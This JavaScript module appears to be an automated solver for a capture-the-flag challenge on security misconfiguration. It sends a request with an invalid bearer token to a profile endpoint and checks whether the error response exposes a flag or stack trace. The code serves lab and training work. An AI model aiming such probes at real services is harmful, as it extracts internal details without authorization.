/**
 * Challenge: 0xa8 - Security Misconfiguration
 * Exploit: Send invalid token to any endpoint, get stack trace with flag
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa8');
    log('Starting 0xa8 exploit: Security Misconfiguration');

    // Send request with invalid token to trigger error handling
    const invalidToken = 'invalid_token_12345';

    log('Sending request with invalid token to trigger error...');
    const result = await httpRequest(`${baseUrl}/api/profile`, {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${invalidToken}`,
        },
    });

    log(`Error response: ${JSON.stringify(result.data)}`);

    // Check if flag is in response (error handling exposes it)
    const flag = extractFlag(JSON.stringify(result.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // Check if error/stack trace is exposed
    const responseText = JSON.stringify(result.data).toLowerCase();
    if (responseText.includes('stack') || responseText.includes('error') || 
        responseText.includes('misconfiguration')) {
        log('✅ Exploit successful - error handling exposed information');
        log(`Stack trace/error details: ${JSON.stringify(result.data)}`);
        return { success: true };
    }

    log('❌ Exploit may have failed');
    return { success: false };
}

module.exports = { run };
